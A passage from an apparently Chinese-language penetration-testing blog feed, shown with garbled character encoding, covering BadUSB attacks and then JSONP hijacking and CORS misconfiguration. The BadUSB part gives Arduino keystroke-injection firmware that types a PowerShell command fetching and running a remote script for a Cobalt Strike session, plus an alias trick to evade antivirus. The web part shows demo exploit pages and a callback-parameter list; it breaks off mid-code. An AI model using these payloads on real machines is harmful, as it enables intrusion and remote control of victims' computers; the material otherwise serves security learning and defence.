ç”¨äºåœ¨æ‰§è¡Œåç»­æ“ä½œå‰æš‚åœä¸€æ®µæ—¶é—´ï¼Œå•ä½ä¸ºæ¯«ç§’</span><br></pre></td></tr></table></figure><h1 id="å¼¹è®¡ç®—å™¨"><a href="#å¼¹è®¡ç®—å™¨" class="headerlink" title="å¼¹è®¡ç®—å™¨"></a>å¼¹è®¡ç®—å™¨</h1><p>Arduinoä»£ç </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;DigiKeyboard.h&quot;</span></span></span><br><span class="line">String a;</span><br><span class="line">String b;</span><br><span class="line">String c;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span> &#123;</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">57</span>); <span class="comment">// å¼€å¯CapsLockå¤§å†™é”å®šé”®ç»•è¿‡ä¸­æ–‡è¾“å…¥æ³•é—®é¢˜(windowså¤§å°å†™ä¸æ•æ„Ÿ)</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); <span class="comment">// æŒ‰ä¸‹Win+Ré”®</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">800</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;calc&quot;</span>); <span class="comment">// æ‰“å¼€è®¡ç®—å™¨</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">57</span>); <span class="comment">// å…³é—­CapsLockå¤§å†™é”å®šé”®</span></span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span> &#123;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/%E5%8A%A8%E7%94%BB.gif" alt="åŠ¨ç”»"></p><h1 id="PowerShell-Bypassç«ç»’ä¸Šçº¿CS"><a href="#PowerShell-Bypassç«ç»’ä¸Šçº¿CS" class="headerlink" title="PowerShell  Bypassç«ç»’ä¸Šçº¿CS"></a>PowerShell  Bypassç«ç»’ä¸Šçº¿CS</h1><p><a href="https://mp.weixin.qq.com/s/5Bx9fYiI_mK2yimSsDyhoA">å¹²è´§ | æˆ‘çš„powershellå…æ€ä¹‹è·¯ (qq.com)</a></p><p>åŸå§‹payload</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.23.102:8000/one_liner.ps1&#x27;))&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231007134142125.png" alt="image-20231007134142125"></p><p>Bypass</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="built_in">set-alias</span> <span class="literal">-name</span> kaspersky <span class="literal">-value</span> <span class="built_in">Invoke-Expression</span>;kaspersky(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.23.102:8000/one_liner.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure><p>è½¬åŒ–ä¸ºArduinoä»£ç </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;DigiKeyboard.h&quot;</span></span></span><br><span class="line">String a;</span><br><span class="line">String b;</span><br><span class="line">String c;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span> &#123;</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">57</span>);<span class="comment">//å¼€å¯CapsLockå¤§å†™é”å®šé”®</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);<span class="comment">//æŒ‰ä¸‹Win+Ré”®</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">800</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;powershell set-alias -name kaspersky -value Invoke-Expression;kaspersky(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.23.102:8000/one_liner.ps1&#x27;)&quot;</span>);</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">57</span>);<span class="comment">//å…³é—­CapsLockå¤§å†™é”å®šé”®</span></span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span> &#123;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/22.gif" alt="22"></p><h1 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h1><p>ç”±äºæ¶æ„ä»£ç å†…ç½®äºè®¾å¤‡åˆå§‹åŒ–å›ºä»¶ä¸­ï¼Œè€Œä¸æ˜¯é€šè¿‡autorun.infç­‰åª’ä½“è‡ªåŠ¨æ’­æ”¾æ–‡ä»¶è¿›è¡Œæ§åˆ¶ï¼Œå› æ­¤æ— æ³•é€šè¿‡ç¦ç”¨åª’ä½“è‡ªåŠ¨æ’­æ”¾è¿›è¡Œé˜²å¾¡ï¼Œæ€æ¯’è½¯ä»¶æ›´æ˜¯æ— æ³•æ£€æµ‹è®¾å¤‡å›ºä»¶ä¸­çš„æ¶æ„ä»£ç ã€‚ç›®å‰ä¹Ÿæ²¡æœ‰ä»€ä¹ˆæœ‰æ•ˆçš„æ–¹å¼å»é˜²å¾¡BadUSBï¼Œæ¯•ç«Ÿæ— æ³•é˜»æŒ¡ç”µè„‘å»è¯†åˆ«é”®ç›˜é¼ æ ‡æ­¤ç±»çš„HIDè®¾å¤‡ã€‚æ‰€ä»¥è¯´é’ˆå¯¹BadUSBçš„é˜²å¾¡æ–¹æ³•è¿˜æ˜¯åœ¨äºäººå‘˜çš„å®‰å…¨æ„è¯†ä¸Šï¼Œå½“å‘ç°å¯ç–‘çš„Uç›˜æ—¶åˆ‡è«å› å¥½å¥‡æ’å…¥è‡ªå·±çš„ç”µè„‘ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JSONPä¸CORS</title>
      <link href="/2023/10/05/Web%E5%AE%89%E5%85%A8%E4%B9%8BJSONP%E4%B8%8ECORS/"/>
      <url>/2023/10/05/Web%E5%AE%89%E5%85%A8%E4%B9%8BJSONP%E4%B8%8ECORS/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h1><p><strong>åŒæºç­–ç•¥</strong></p><ul><li><p>ç›®çš„</p><blockquote><p>åŒæºç­–ç•¥çš„ç›®çš„ï¼Œæ˜¯ä¸ºäº†ä¿è¯ç”¨æˆ·ä¿¡æ¯çš„å®‰å…¨ï¼Œé˜²æ­¢æ¶æ„çš„ç½‘ç«™çªƒå–æ•°æ®ã€‚</p><p>è®¾æƒ³è¿™æ ·ä¸€ç§æƒ…å†µï¼šAç½‘ç«™æ˜¯ä¸€å®¶é“¶è¡Œï¼Œç”¨æˆ·ç™»å½•ä»¥åï¼Œåˆå»æµè§ˆå…¶ä»–ç½‘ç«™ã€‚å¦‚æœå…¶ä»–ç½‘ç«™å¯ä»¥è¯»å–Aç½‘ç«™çš„ Cookieï¼Œä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</p><p>å¾ˆæ˜¾ç„¶ï¼Œå¦‚æœ Cookie åŒ…å«éšç§ï¼ˆæ¯”å¦‚å­˜æ¬¾æ€»é¢ï¼‰ï¼Œè¿™äº›ä¿¡æ¯å°±ä¼šæ³„æ¼ã€‚æ›´å¯æ€•çš„æ˜¯ï¼ŒCookie å¾€å¾€ç”¨æ¥ä¿å­˜ç”¨æˆ·çš„ç™»å½•çŠ¶æ€ï¼Œå¦‚æœç”¨æˆ·æ²¡æœ‰é€€å‡ºç™»å½•ï¼Œå…¶ä»–ç½‘ç«™å°±å¯ä»¥å†’å……ç”¨æˆ·ï¼Œä¸ºæ‰€æ¬²ä¸ºã€‚å› ä¸ºæµè§ˆå™¨åŒæ—¶è¿˜è§„å®šï¼Œæäº¤è¡¨å•ä¸å—åŒæºæ”¿ç­–çš„é™åˆ¶ã€‚</p><p>ç”±æ­¤å¯è§ï¼Œâ€åŒæºç­–ç•¥â€æ˜¯å¿…éœ€çš„ï¼Œå¦åˆ™ Cookie å¯ä»¥å…±äº«ï¼Œäº’è”ç½‘å°±æ¯«æ— å®‰å…¨å¯è¨€äº†ã€‚</p></blockquote></li><li><p>å®šä¹‰</p><p>ä¸¤ä¸ªwebç•Œé¢åªæœ‰åŒåè®®ï¼ŒåŒåŸŸåï¼ŒåŒç«¯å£æ‰æ˜¯åŒæºçš„</p><p><img src="/../images/pxbcwxexdh-1686840019399.png" alt="img"></p></li></ul><h1 id="JSONPæ¼æ´"><a href="#JSONPæ¼æ´" class="headerlink" title="JSONPæ¼æ´"></a>JSONPæ¼æ´</h1><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><ul><li><p>JSONP</p><blockquote><p>ç”±äºæµè§ˆå™¨çš„åŒæºç­–ç•¥é™åˆ¶ï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼Œå®¢æˆ·ç«¯é™¤äº†å¯ä»¥è·¨åŸŸè·å–å›¾ç‰‡ï¼ŒCSSï¼ŒJavaScriptå½¢å¼çš„æ•°æ®å¤–æ— æ³•ä»ä¸åŒæºçš„webç«™ç‚¹è·å–æ•°æ®ã€‚JSONPå°±æ˜¯åˆ©ç”¨äº†JavaScriptå¯ä»¥è·¨åŸŸåŠ è½½çš„ç‰¹ç‚¹ï¼Œå°†æ¥å£è®¾è®¡ä¸ºjsonæ ¼å¼ï¼Œä»è€Œå¯ä»¥è·¨åŸŸè°ƒç”¨JSONPæ¥å£æ¥è·å–æ•°æ®ã€‚</p></blockquote></li><li><p>JSONPåŠ«æŒæ¼æ´</p><blockquote><p>JSONPåŠ«æŒæ¼æ´æ˜¯æŒ‡ç½‘ç«™JSONPæ¥å£æ³„éœ²çš„ä¿¡æ¯å¯è¢«æ”»å‡»è€…é€šè¿‡åœ¨å¯æ§ç½‘ç«™æ„é€ è¯·æ±‚çš„æ–¹å¼ï¼Œæ“ä½œç”¨æˆ·æµè§ˆå™¨<strong>è·¨åŸŸè¯»å–å¹¶æ¥æ”¶</strong>çš„ä¸€ç±»å®‰å…¨é—®é¢˜ã€‚</p></blockquote></li></ul><h2 id="æ¼æ´äº§ç”ŸåŸå› "><a href="#æ¼æ´äº§ç”ŸåŸå› " class="headerlink" title="æ¼æ´äº§ç”ŸåŸå› "></a>æ¼æ´äº§ç”ŸåŸå› </h2><p>ä¸‹é¢é€šè¿‡Demoä»£ç æ¼”ç¤º</p><p>å‡è®¾<a href="http://debug.io:90/%E4%B8%8A%E5%AD%98%E5%9C%A8%E5%A6%82%E4%B8%8B%E4%BB%A3%E7%A0%81">http://debug.io:90/ä¸Šå­˜åœ¨å¦‚ä¸‹ä»£ç </a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//jsonp.php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line"><span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line"><span class="keyword">print</span> <span class="variable">$callback</span>.<span class="string">&#x27;(&#123;&quot;name&quot; : &quot;khaz&quot;,&quot;age&quot; : &quot;18&quot;&#125;);&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231005201905213.png" alt="image-20231005201905213"></p><p>é‚£ä¹ˆ<a href="http://localhostå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è·å–http//debug.io:90/%E4%B8%8A%E7%9A%84%E6%95%B0%E6%8D%AE">http://localhostå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è·å–http://debug.io:90/ä¸Šçš„æ•°æ®</a></p><ul><li><p>scriptæ ‡ç­¾çš„srcå±æ€§</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--1.html--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">data</span>)</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">alert</span>(data.<span class="property">name</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://debug.io:90/jsonp.php?callback=test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231005202129724.png" alt="image-20231005202129724"></p></li><li><p>ajaxè¯·æ±‚</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://cdn.static.runoob.com/libs/jquery/1.8.3/jquery.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    $.<span class="title function_">getJSON</span>(<span class="string">&quot;http://debug.io:90/jsonp.php?callback=?&quot;</span>, <span class="keyword">function</span>(<span class="params">data</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="title function_">alert</span>(data.<span class="property">age</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231005202436331.png" alt="image-20231005202436331"></p></li></ul><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="æ”»å‡»æµç¨‹"><a href="#æ”»å‡»æµç¨‹" class="headerlink" title="æ”»å‡»æµç¨‹"></a><strong>æ”»å‡»æµç¨‹</strong></h3><p><img src="/../images/jsonp-exploit.png" alt="jsonp-exploit"></p><p>å½“ç½‘ç«™çš„JSONPæ¥å£æ²¡æœ‰åšå¥½é˜²æŠ¤ï¼Œå¹¶ä¸”å­˜åœ¨æ•æ„Ÿæ•°æ®æ—¶ï¼Œæ”»å‡»è€…å°±å¯ä»¥æ„é€ æ¶æ„çš„htmlé¡µé¢è¯±å¯¼å—å®³è€…ç‚¹å‡»ï¼Œä»è€Œæºå¸¦ç”¨æˆ·çš„cookieç­‰ä¿¡æ¯å‘jsonpæ¥å£å‘èµ·è¯·æ±‚ï¼Œå¹¶é€šè¿‡callbackå°†è·å–åˆ°çš„æ•æ„Ÿæ•°æ®å‘ç»™æ”»å‡»è€…ã€‚</p><h3 id="å¸¸è§å‚æ•°"><a href="#å¸¸è§å‚æ•°" class="headerlink" title="å¸¸è§å‚æ•°"></a>å¸¸è§å‚æ•°</h3><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">_callback=mstkey</span><br><span class="line">_cb=mstkey</span><br><span class="line">callback=mstkey</span><br><span class="line">cb=mstkey</span><br><span class="line">jsonp=mstkey</span><br><span class="line">jsonpcallback=mstkey</span><br><span class="line">jsonpcb=mstkey</span><br><span class="line">jsonp_cb=mstkey</span><br><span class="line">json=mstkey</span><br><span class="line">jsoncallback=mstkey</span><br><span class="line">jcb=mstkey</span><br><span class="line">call=mstkey</span><br><span class="line">callBack=mstkey</span><br><span class="line">jsonpCallback=mstkey</span><br><span class="line">jsonpCb=mstkey</span><br><span class="line">jsonp_Cb=mstkey</span><br><span class="line">jsonCallback=mstkey</span><br><span class="line">ca=mstkey</span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨æ‰‹æ³•"><a href="#åˆ©ç”¨æ‰‹æ³•" class="headerlink" title="åˆ©ç”¨æ‰‹æ³•"></a>åˆ©ç”¨æ‰‹æ³•</h3><ul><li><p>è·å–jsonpä¸­çš„æ•æ„Ÿä¿¡æ¯</p></li><li><p>æ°´å‘æ”»å‡»</p><p>æ°´å‘æ”»å‡»å°±æ˜¯åœ¨å—å®³è€…å¿…ç»ä¹‹è·¯è®¾ç½®ä¸€ä¸ªæ°´å‘ï¼Œä¹Ÿå°±æ˜¯é™·é˜±ã€‚æ”»å‡»è€…é€šè¿‡åˆ†æå—å®³è€…çš„ä¸Šç½‘æ´»åŠ¨è§„å¾‹ï¼Œç»å¸¸è®¿é—®å“ªäº›ç½‘ç«™ï¼Œç„¶ååˆ©ç”¨ç½‘ç«™æ¼æ´åœ¨å…¶ä¸­æ¤å…¥æ”»å‡»ä»£ç ã€‚æ¯”å¦‚æ”»å‡»è€…é€šè¿‡åˆ†æå¾—çŸ¥å—å®³è€…ç»å¸¸è®¿é—®ç½‘ç«™Aå’ŒBï¼Œå¹¶æƒ³è¦å¾—åˆ°å—å®³è€…åœ¨ç½‘ç«™Aä¸Šçš„æ•æ„Ÿæ•°æ®ï¼Œè€Œç½‘ç«™Bå®‰å…¨æ€§ç›¸å¯¹è–„å¼±ï¼Œäºæ˜¯æ”»å‡»è€…åœ¨ç½‘ç«™Bä¸­æ¤å…¥JSONPåˆ©ç”¨ä»£ç ï¼Œå½“å—å®³è€…è®¿é—®ç½‘ç«™Bæ—¶ï¼Œå°±ä¼šé€šè¿‡JSONPè·¨åŸŸè®¿é—®ç½‘ç«™Aä»è€Œè·å–å—å®³è€…åœ¨ç½‘ç«™Aä¸Šçš„æ•æ„Ÿæ•°æ®ã€‚</p></li><li><p>èœœç½æº¯æº</p><p>èœœç½èƒ½å¤Ÿå¯¹æ”»å‡»è€…ç”»åƒè¿›è¡Œç”»åƒå’Œæº¯æºçš„åŸç†å°±æ˜¯èœœç½ä¸­é›†æˆäº†å¤§é‡ç¤¾äº¤ç½‘ç«™çš„JSONPæ¥å£ã€‚å½“æ”»å‡»è€…å‘èµ·æ”»å‡»æ—¶ï¼Œå¦‚æœå…¶ä½¿ç”¨çš„æµè§ˆå™¨ä¿å­˜äº†ç¤¾äº¤ç½‘ç«™çš„ç™»å½•ä¿¡æ¯ï¼Œå°±æœ‰å¯èƒ½å› ä¸ºè§¦å‘äº†èœœç½çš„JSONPåˆ©ç”¨ä»£ç è€Œç•™ä¸‹ä¸ªäººç¤¾äº¤ä¿¡æ¯ã€‚</p></li></ul><h3 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h3><ul><li>å¯¹è¯·æ±‚çš„æ¥æºè¿›è¡Œæ ¡éªŒï¼Œå¦‚Refererï¼ŒOriginç­‰å‚æ•°</li><li>å°½é‡ä¸ä½¿ç”¨JSONPæ¥å£æ¥ä¼ è¾“æ•æ„Ÿæ•°æ®</li><li>ä½¿ç”¨CORSæ¥ä»£æ›¿JSONP</li></ul><h1 id="CORSæ¼æ´"><a href="#CORSæ¼æ´" class="headerlink" title="CORSæ¼æ´"></a>CORSæ¼æ´</h1><h2 id="ä»‹ç»-1"><a href="#ä»‹ç»-1" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>CORSæ¼æ´æ˜¯æŒ‡å› ä¸ºç½‘ç«™é…ç½®ç¼ºé™·å¦‚Access-Control-Allow-Originé…ç½®ä¸ºâ€*â€æ—¶ï¼Œå¯¼è‡´å…¶ä»–ç½‘ç«™å¯ä»¥ç›´æ¥è·¨åŸŸåŠ è½½è¯»å–è¯¥ç½‘ç«™ä¸Šçš„æ•°æ®ã€‚</p><p><strong>CORS</strong></p><blockquote><p>CORSï¼ˆCross-Origin Resource Sharingï¼‰æ˜¯ä¸€ç§<strong>è·¨åŸŸèµ„æºå…±äº«æœºåˆ¶</strong>ï¼Œå®ƒå…è®¸Webåº”ç”¨ç¨‹åºä»ä¸åŒçš„åŸŸåè®¿é—®èµ„æºï¼Œè€Œä¸å—åŒæºç­–ç•¥çš„é™åˆ¶ã€‚CORSæœºåˆ¶éœ€è¦åœ¨æœåŠ¡ç«¯è¿›è¡Œé…ç½®ï¼Œå¹¶ä¸”éœ€è¦åœ¨æ¯ä¸ªè·¨åŸŸè¯·æ±‚ä¸­æ·»åŠ ç‰¹å®šçš„HTTPå¤´éƒ¨ä¿¡æ¯ï¼Œä¾‹å¦‚â€œAccess-Control-Allow-Originâ€å’Œâ€œAccess-Control-Allow-Methodsâ€ç­‰ã€‚CORSæœºåˆ¶å¯ä»¥æ”¯æŒå„ç§ç±»å‹çš„HTTPè¯·æ±‚ï¼ŒåŒ…æ‹¬GETã€POSTã€PUTã€DELETEç­‰ï¼Œå› æ­¤å®ƒåœ¨Webåº”ç”¨ç¨‹åºä¸­çš„åº”ç”¨éå¸¸å¹¿æ³›ã€‚</p></blockquote><p><strong>å®¢æˆ·ç«¯â€“CORSç®€å•è¯·æ±‚</strong></p><p>ç¬¦åˆä»¥ä¸‹æ¡ä»¶çš„ä¸ºç®€å•è¯·æ±‚</p><ul><li><p>è¯·æ±‚æ–¹æ³•ä¸ºgetï¼Œpostï¼Œheadä¸­çš„ä¸€ç§</p></li><li><p>headerå¤´ä¸ºä»¥ä¸‹å­—æ®µçš„å­é›†</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">Accept</span><br><span class="line">Accept-language</span><br><span class="line">Content-language</span><br><span class="line">Last-Event-ID</span><br><span class="line">Content-Type:application/x-www-form-urlencoded,multipart/form-data,text/plain</span><br></pre></td></tr></table></figure></li></ul><p><strong>å®¢æˆ·ç«¯â€“CORSéç®€å•è¯·æ±‚ï¼ˆä¸ç¬¦åˆç®€å•è¯·æ±‚çš„æ¡ä»¶æ—¶ï¼‰</strong></p><p>å®¢æˆ·ç«¯éç®€å•è¯·æ±‚æµç¨‹</p><ul><li>ç¬¬ä¸€æ¬¡è¯·æ±‚ä¸ºé¢„æ£€è¯·æ±‚ï¼ˆOPTIONSæ–¹æ³•ï¼ŒOriginè¯·æ±‚å¤´ï¼‰</li><li>æ ¹æ®æœåŠ¡å™¨è¿”å›çš„responseæ¥åˆ¤æ–­æ˜¯å¦èƒ½å¤Ÿå‘èµ·CORSè¯·æ±‚</li></ul><p><strong>æœåŠ¡ç«¯é…ç½®</strong></p><p><strong>ç›¸å…³çš„å¤´éƒ¨å­—æ®µå«ä¹‰</strong></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span> å¿…éœ€é¡¹ï¼Œå‘Šè¯‰æµè§ˆå™¨å…è®¸è¯¥æºè®¿é—®èµ„æºã€‚</span><br><span class="line"><span class="attribute">Access-Control-Allow-Headers</span><span class="punctuation">: </span>å¿…éœ€é¡¹ï¼ŒæŒ‡æ˜äº†å®é™…è¯·æ±‚ä¸­å…è®¸æºå¸¦çš„æ ‡å¤´å­—æ®µã€‚</span><br><span class="line"><span class="attribute">Access-Control-Allow-Methods</span><span class="punctuation">: </span>å¯é€‰é¡¹ï¼ŒæŒ‡å®šäº†è®¿é—®èµ„æºæ—¶å…è®¸ä½¿ç”¨çš„è¯·æ±‚æ–¹æ³•</span><br><span class="line">Access-Control-Allow-Credentials:è¡¨ç¤ºæ˜¯å¦å…è®¸å‘é€cookieï¼Œé»˜è®¤ä¸å…è®¸ã€‚è®¾ç½®ä¸ºtrueæ—¶ï¼Œå¯ä»¥å‘é€cookie</span><br></pre></td></tr></table></figure><p>Nginxé…ç½®Demo</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> = /corstest.php &#123;</span><br><span class="line">            <span class="attribute">root</span>   /var/www/html;</span><br><span class="line">            <span class="attribute">add_header</span> Access-Control-Allow-Origin *;</span><br><span class="line">            <span class="attribute">add_header</span> Access-Control-Allow-Methods <span class="string">&#x27;GET, POST, OPTIONS&#x27;</span>;</span><br><span class="line">            <span class="attribute">add_header</span> Access-Control-Allow-Headers <span class="string">&#x27;DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization&#x27;</span>;</span><br><span class="line">            <span class="attribute">if</span> (<span class="variable">$request_method</span> = <span class="string">&#x27;OPTIONS&#x27;</span>) &#123;</span><br><span class="line">                     <span class="attribute">return</span> <span class="number">204</span>;</span><br><span class="line">            &#125;</span><br><span class="line">â€¦â€¦</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»£ç é…ç½®Demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Access-Control-Allow-Origin: *&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Access-Control-Allow-Methods:GET, POST, OPTIONS&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Access-Control-Allow-Headers:DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>æœåŠ¡ç«¯å¯¹äºè·¨åŸŸè¯·æ±‚çš„å¤„ç†æµç¨‹</strong></p><p><img src="/../images/image-20231005214817023.png" alt="image-20231005214817023"></p><h2 id="æ¼æ´åˆ©ç”¨-1"><a href="#æ¼æ´åˆ©ç”¨-1" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>é”™è¯¯çš„<code>Access-Control-Allow-Origin</code>é…ç½®</p><p><a href="http://debug.io:90/cors_read.html">http://debug.io:90/cors_read.html</a></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://127.0.0.1/cors.php&#x27;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// If specified, responseType must be empty string or &quot;text&quot;</span></span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="property">responseType</span> = <span class="string">&#x27;text&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (xhr.<span class="property">readyState</span> === xhr.<span class="property">DONE</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (xhr.<span class="property">status</span> === <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">write</span>(xhr.<span class="property">responseText</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="title function_">send</span>(<span class="literal">null</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="http://127.0.0.1/cors.php">http://127.0.0.1/cors.php</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// header(&quot;Access-Control-Allow-Origin: *&quot;);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;table border=<span class="string">&quot;1&quot;</span>&gt;</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">    &lt;th&gt;name&lt;/th&gt;</span><br><span class="line">    &lt;th&gt;password&lt;/th&gt;</span><br><span class="line">  &lt;/tr&gt;</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">    &lt;td&gt;Jack&lt;/td&gt;</span><br><span class="line">    &lt;td&gt;<span class="number">1</span>ui23p=<span class="number">13</span>!&lt;/td&gt;</span><br><span class="line">  